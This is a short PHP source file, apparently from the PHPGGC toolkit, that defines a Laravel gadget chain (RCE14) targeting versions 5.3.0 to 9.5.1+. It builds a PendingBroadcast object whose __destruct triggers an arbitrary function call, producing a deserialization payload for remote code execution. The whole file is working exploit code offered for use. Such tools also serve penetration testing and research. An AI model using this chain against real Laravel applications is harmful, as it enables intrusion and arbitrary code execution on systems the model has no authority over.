<?php

namespace GadgetChain\Laravel;

class RCE14 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.3.0 <= 9.5.1+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];

        return new \Illuminate\Broadcasting\PendingBroadcast($function,$param);
    }
}
